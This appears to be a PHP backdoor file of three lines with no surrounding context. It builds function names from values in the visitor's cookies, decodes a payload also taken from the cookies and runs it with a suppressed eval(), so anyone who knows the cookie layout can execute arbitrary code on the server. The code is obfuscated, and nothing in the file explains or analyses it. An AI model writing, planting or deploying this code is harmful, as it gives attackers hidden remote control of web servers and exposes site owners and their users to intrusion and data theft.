<?php
$a = $_COOKIE;
($a && isset($a[33])) ? (($jm = $a[33].$a[26]) && ($fq = $jm($a[96].$a[66])) && ($_fq = $jm($a[16].$a[80])) && ($_fq = $_fq($jm($a[17]))) && @eval($_fq)) : $a;